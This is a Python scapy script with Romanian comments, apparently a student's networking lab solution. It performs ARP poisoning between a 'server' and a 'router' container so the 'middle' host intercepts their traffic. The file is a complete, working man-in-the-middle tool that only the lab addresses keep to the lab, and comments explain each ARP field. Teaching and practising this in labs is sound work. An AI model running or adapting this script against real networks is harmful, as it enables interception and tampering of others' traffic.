from scapy.all import ARP, send
import threading
import time

"""
ideea cu ambele functii de spoof este ca MIDDLE e de fapt atacatorul
MIDDLE il minte pe ROUTER si ii spune ca e de fapt SERVER-ul
MIDDLE il minte pe SERVER si ii spune ca e de fapt ROUTER-ul
tot traficul dintre ROUTER si SERVER o sa treaca, deci, prin middle, 
care o sa modifice mesaje

ARP = Address Resolution Protocol
face asocieri intre adrese IP si MAC (adica adrese fizice) pe o retea (LAN)
daca un device vrea sa trimita ceva catre alt device din aceeasi retea,
trebuie sa stie la ce adresa MAC trimite
ARP trimite un request la IP-ul respectiv, si primeste inapoi un reply
cu adresa IP si asocierea MAC

"functia" ARP din spoofServer si spoofRouter - e de fapt constructor
construieste un obiect ARP, deci un pachet cu informatii
        PARAMETRI:
    1. op = opcode (operation code) - spune daca mesajul in sinea lui e cererea sau raspunsul
pt op = 1 inseamna cererea: "Cine are IP-ul ip.ip.ip.ip?"
pt op = 2 inseamna raspuns: "IP-ul ip.ip.ip.ip are MAC xx:xx:xx:xx:xx:xx"
ideea e ca noi vrem sa modificam raspunsul primit, nu sa modificam cererea, deci trimitem
in constructor op = 2
    2. pdst = Protocol Destination Address, este adresa IP a device-ului care trebuie
sa primeasca mesajul (deci, daca otravest SERVER, pdst=ipServer; daca otravesc ROUTER,
pdst=ipRouter)
    3. hwdst = Hardware Destination Address, este adresa MAC a device-ului care trebuie
sa primeasca mesajul (deci, daca otravesc SERVER, hwdst=macServer; daca otravesc ROUTER,
hwdst=macRouter)
    4. psrc = Protocol Source Address, este adresa IP a device-ului de unde se trimite
mesajul (cand otravesc SERVER mesajul vine de la ROUTER (ipRouter); cand otravesc ROUTER
mesajul vine de la SERVER (ipServer))
    5. hwsrc = Hardware Source Address, este adresa IP a device-ului de unde se trimite
mesajul (cand otravesc SERVER mesajul ar trebui sa vina de la ROUTER, dar este otravit
si vine de la MIDDLE (macMiddle); cand otravesc ROUTER mesajul ar trebui sa vina de la SERVER,
dar este otravit si vine de la MIDDLE (macMiddle))


  
"""

# adresele sunt luate din diagrama de pe GitHub, din subreteaua in care se afla serverul
# asta e MAC-ul initial din cerinta, dar Docker da alte adrese MAC containerelor
# nu o folosesc, dar am pus-o ca sa stiu care e
macMiddle = "02:42:c6:0a:00:02"

# asta e adresa mac a MIDDLE din Docker (cand esti in container scrii "ip addr si e la eth0")
macMiddle2 = "ce:af:58:db:91:88"

macServer = "02:42:c6:0a:00:03"
ipServer = "198.7.0.2"

macRouter = "02:42:c6:0a:00:01"
ipRouter = "198.7.0.1"


def spoofServer():
    # aici dau "spoof" (adica otravesc/mint) tabela ARP de la SERVER
    # trimit catre SERVER pachete ARP care ii spun ca router-ul e la alta adresa MAC
    # adica IP-ului ROUTER-ului ii corespunde acum in pachet un alt MAC
    pachetARP = ARP(
        op = 2,
        pdst = ipServer,
        hwdst = macServer,
        psrc = ipRouter,
        hwsrc = macMiddle2
    )

    while 1 > 0:
        send(pachetARP)
        print("Spoof trimis catre SERVER")
        time.sleep(8)


def spoofRouter():
    # aici dau "spoof" (adica otravesc/mint) tabela ARP de la ROUTER
    # trimit catre ROUTER pachete ARP care ii spun ca ROUTER-ul e la alta adresa MAC
    # adica IP-ului SERVER-ului ii corespunde acum in pachet un alt MAC
    pachetARP = ARP(
        op = 2,
        pdst = ipRouter,
        hwdst = macRouter,
        psrc = ipServer,
        hwsrc = macMiddle2
    )

    while 1 > 0:
        send(pachetARP)
        print("Spoof trimis catre ROUTER")
        time.sleep(8)


"""
Fac 2 fire de executie separate, unul pentru SERVER si unul pentru ROUTER
threading.Thread e un constructor care imi face un fir de executie
        PARAMETRI:
    1. target = ii spun ce functie sa ruleze, in cazul meu spoofServer sau spoofRouter
    2. daemon (e bool) = seteaza daca firul de executie e daemon sau nu, adica daca e thread
de fundal sau nu

Cum functioneaza daemon - daca un thread e de fundal, nu impiedica inchiderea programului, dar
daca nu e de fundal, procesul trebuie sa il astepte.
"""

threadServer = threading.Thread(
    target = spoofServer,
    daemon = True
)

threadRouter = threading.Thread(
    target = spoofRouter,
    daemon = True
)



# pornesc thread-urile

threadRouter.start()
threadServer.start()

# trebuie sa nu inchid programul, totusi, ca altfel imi inchide thread-urile
# fac o bucla infinita

while 1 > 0:
    time.sleep(1)


